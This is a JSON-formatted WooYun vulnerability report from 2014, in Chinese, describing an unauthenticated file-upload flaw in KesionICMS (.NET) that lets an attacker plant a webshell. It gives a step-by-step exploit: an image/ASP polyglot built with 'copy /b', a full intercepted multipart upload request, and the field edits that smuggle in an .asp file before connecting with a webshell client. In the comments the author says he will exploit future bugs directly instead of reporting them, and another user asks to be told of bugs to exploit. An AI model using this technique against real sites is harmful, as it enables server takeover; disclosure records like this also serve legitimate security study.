{"id": 471, "wybug_id": "wooyun-2014-070062", "wybug_title": "KesionICMS(.net)可无视任何条件前台getshell", "wybug_corp": "kesion.com", "wybug_author": "zph", "wybug_date": "2014-07-29 15:37", "wybug_open_date": "2014-10-24 15:38", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-03：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向公众公开  简要描述： KesionICMS除了自带的文章、图片、下载系统外还可以在文章、图片、下载三个系统模型的基础上自定义出功能模型比如房产系统，酒店系统，图片系统，软件下载等；自定义表单助您轻松打造在线报名，举报投诉等功能。10年开发经验的优秀团队，在掌握了丰富的WEB开发经验和CMS产品开发经验的同时，勇于创新追求完美的设计理念，力争为全球更多网站提供助力，并被更多的政府机构、教育机构、事业单位、商业企业、个人站长所认可。 详细说明：  KesionICMS某个频道上传功能的地方有缺陷，导致漏洞形成。本漏洞测试的时候无需登录，即可进行操作。问题出在：User\\Include\\UpLoad.ashx，程序只对上传时的文件进行一系列判断，但是没有在文件上传后进行判断，导致可以getshell。因为官网demo有 安全狗，所以不能用官网来演示菜刀连接……但证明成功上传还是可以的\n\n0x01 准备由于程序会对图片的有效性进行判断，所以我们不得不copy一下\ncopy /b 1.jpg+1.asp 123.jpg\n其中1.jpg为随意有效图片文件，1.asp为一句话，得到的123.jpg即为copy后待上传的图片文件。   漏洞证明：  0x02 上传&改包用burp截包如下：\nPOST /user/include/upload.ashx HTTP/1.1Accept: text/*Content-Type: multipart/form-data; boundary=----------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4User-Agent: Shockwave FlashHost: www.******.comContent-Length: 18389Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASP.NET_SessionId=dd1zohqmmxotk045nu52vsaf------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"Filename\"2.jpg------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"AutoRename\"4------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"formid\"0------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"FieldID\"pic------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"upBySwf\"1------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"ispic\"0------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"ChannelID\"1001------------ei4gL6cH2ae0KM7Ij5Ef1ae0KM7ei4Content-Disposition: form-data; name=\"Filedata\"; filename=\"2.jpg\"Content-Type: application/octet-stream（省略文件内容）------------KM7ei4KM7cH2ei4Ef1ei4ae0KM7GI3Content-Disposition: form-data; name=\"Upload\"Submit Query------------KM7ei4KM7cH2ei4Ef1ei4ae0KM7GI3--\n我们做以下几个修改：（这块语言可能描述的不太好，大家谅解，下面会有一个视频演示来帮大家理解）1.复制以下内容（不同网站内容可能不完全相同）\n------------KM7ei4KM7cH2ei4Ef1ei4ae0KM7GI3Content-Disposition: form-data; name=\"Filename\"2.jpg\n并在2.jpg后面回车、粘贴\n\n2.将第二个2.jpg改为asp后缀文件3.将第二个Filename改为Filenames4.复制以下内容（不同网站内容可能不完全相同）\n------------KM7ei4KM7cH2ei4Ef1ei4ae0KM7GI3Content-Disposition: form-data; name=\"upBySwf\"1\n并在1后面回车、粘贴\n\n5.将第二个upBySwf改为NoReName至此就完成修改了。下面按Ctrl+R将Raw发送到Repeater，点击Go 显示出文件路径\n\n菜刀连接即可\n\n演示视频：http://pan.baidu.com/s/1eQrIj7c 密码ptr5 不听歌的话就静音 :)   修复方案：  文件上传后判断是否合法加强安全意识吧，骚年们 :)   版权声明：转载请注明来源 zph@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-10-24 15:38 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-29 15:45 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  这个不是KesionCMS啊……是KesionICMS，KesionCMS是asp的，KesionICMS才是asp.net的，求解为什么会改这里 @xsser @疯狗    \n     2014-07-29 15:51 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @zph 嗯 ICMS 同一个厂商旗下的    \n     2014-07-29 15:52 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @疯狗 是的，主要是KesionCMS和ICMS不是一个产品，一个是asp，一个是.net，不过谢谢啦 :)    \n     2014-07-29 16:04 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  另外，@疯狗 这个和 WooYun: Qwbm深山行者留言板可通杀绕过登陆获得后台权限 都是小厂商吗？用户量都不小啊，为什么前台隐藏？    \n     2014-07-29 16:20 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @zph kesioncms是挺多但是KesionICMS不是很多，qwbm（深山行者）cms与旅游建站系统很多，但留言板不多。意思就都是主产品线下面的待发展产品或副产品。    \n     2014-07-30 10:44 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  还是狗哥敬业    \n     2014-07-30 11:40 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @wefgod 是的哈，@疯狗 比较耐心负责 :)    \n     2014-08-04 14:57 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @疯狗 @xsser @Finger 求补rank    \n     2014-08-11 13:44 |    \t\tlck丶 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 求大牛拿0day砸死)\t\t \n  无良厂商= =    \n     2014-08-11 16:58 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @lck丶 kesion就是无良厂商，以后找了洞决不提交了，就直接利用    \n     2014-08-12 21:32 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @疯狗 这如果不给奖金良心何在…………    \n     2014-11-24 10:03 |    \t\tyun联盟 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:1        | 我就是一个小彩笔)\t\t \n  @zph 有漏洞求告知 我也想利用      \n     2015-03-08 22:53 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n     什么版本的  这个是    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}